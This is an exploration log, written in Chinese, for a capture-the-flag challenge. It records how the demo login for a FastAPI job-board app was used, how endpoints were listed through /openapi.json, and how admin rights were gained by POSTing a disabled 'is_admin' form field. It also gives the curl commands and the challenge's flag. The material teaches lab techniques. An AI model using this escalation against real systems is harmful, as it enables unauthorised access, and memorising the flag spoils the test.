# xben-005-24 · 探索记录

对应题解：[`xben-005-24.md`](./xben-005-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`server: uvicorn`，`GET /` 返回 `Login` 页。
题面没有 description，所以第一件事是读首页源码找线索。

首页里直接给了账号：

```html
<p>To try the app you can use the demo account: <strong>Username:</strong> demo, <strong>Password:</strong> demo</p>
```

表单是 `POST /token`，只有 `username`、`password` 两个字段。

## 第一阶段：登录与地形

```bash
curl -i -X POST -d 'username=demo&password=demo' http://$T/token
# 303 See Other
# location: /company/1/jobs
# set-cookie: access_token="Bearer eyJ..."; HttpOnly; Path=/
```

JWT payload 解出来是 `{"sub":"1","exp":1793066116}`，没有角色字段。

登录后导航栏只有两个入口：

```html
<a href="/company/1/jobs">View Jobs</a>
<a href="/system_config/1">Edit Profile</a>
```

`/company/1/jobs` 当时只有一条 `demo Job 1`，正文里没有 flag。

## 第二阶段：`/openapi.json` 一次拿全接口

这是本库的通用动作。FastAPI 默认暴露 OpenAPI：

```json
/token POST
/ GET
/company/{company_id}/jobs GET
/ping GET
/system_config/{company_id} GET,POST
```

省掉了目录爆破。顺手验证了猜测路径全部 404：
`/admin`、`/admin/users`、`/users`、`/users/2`、`/flag`、`/health` —— 都是 404（22 字节）。

## 第三阶段：卡点 —— 先试 IDOR，撞到 401

`/system_config/1` 是"编辑资料"表单：

```html
<input name="name" value="demo" required>
<select name="is_admin" disabled>
    <option value="0" selected>Regular</option>
    <option value="1">Admin</option>
</select>
```

最初思路是越权读别人的配置，于是：

| 请求 | 结果 | 判据 |
| --- | --- | --- |
| `GET /system_config/2` | `401 {"detail":"Could not validate credentials"}` | 不是 403，是**会话校验**失败 |
| `GET /company/2/jobs` | 同样空响应 / 401 | 同上 |

当时误判成"cookie 没带上"，于是把 `-b cj` 换成 `-c cj -b cj` 重新登录过一轮，
结果相同。**真正的判据是响应体**：`detail` 字段来自 FastAPI 的依赖注入，
说明请求在进入处理函数之前就被拒了，与 `company_id=2` 无关——这条路是死路，应当转向。

同时注意到 `is_admin` 被 `disabled` 渲染。`disabled` 只阻止**浏览器**提交该字段。

## 第四阶段：转机 —— 直接 POST 被 disabled 的字段

```bash
curl -b cj -X POST -d 'name=demo&is_admin=1' http://$T/system_config/1
# 200 OK
```

再取一次 `GET /system_config/1`，`is_admin` 变成：

```html
<option value="1" selected>Admin</option>
```

提权生效。

## 第五阶段：提权后的收益

回到岗位列表：

```bash
curl -b cj http://$T/company/1/jobs | grep -o 'flag{[^}]*}'
# flag{2ec88db8-6e11-4640-8774-1d62cf69c522}
```

提权前这条页面只有 `demo Job 1`，flag 是随 `is_admin` 一起放出来的。

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `/admin`、`/admin/users`、`/users`、`/users/2`、`/flag`、`/health` | 全 404（22 字节） | FastAPI 默认 404 体，说明路由确实不存在；`/openapi.json` 也印证只有 5 个路径 |
| `GET /system_config/2`、`GET /company/2/jobs` | 401 `Could not validate credentials` | 请求在依赖注入阶段被拒，与 `company_id` 取值无关 |
| 假定 401 是"cookie 没带上"，重新登录再试 | 仍 401 | 同一响应体，排除 cookie 问题 |
| 在 `POST /system_config/1` 里改 `company_id` / `id` | 无变化 | 记录只按 URL 里的 `company_id` 定位，body 里的同名字段被忽略 |

## 这次真正的收获

1. **`disabled` / `readonly` / `hidden` 是客户端约束。** 表单里凡是"不可编辑"的角色、状态、余额，
   直接 POST 一遍的成本是 1 个请求；去找别的提权路径的成本要高一个数量级。
2. **`/openapi.json` 应该在爆破之前。** 本题 5 个接口一次全出，爆破纯属浪费。
3. **区分 401 和 403。** 401 是"这个会话不被接受"，403 是"身份够了但没权限"。
   本题 401 直接说明按 ID 越权的方向不成立，应该换方向而不是换 cookie。
4. **JWT 里没有 role 是线索。** 说明授权不是靠 token 声明，而是每次回查数据库，
   那么"改自己能改的记录"就等价于"改授权"。
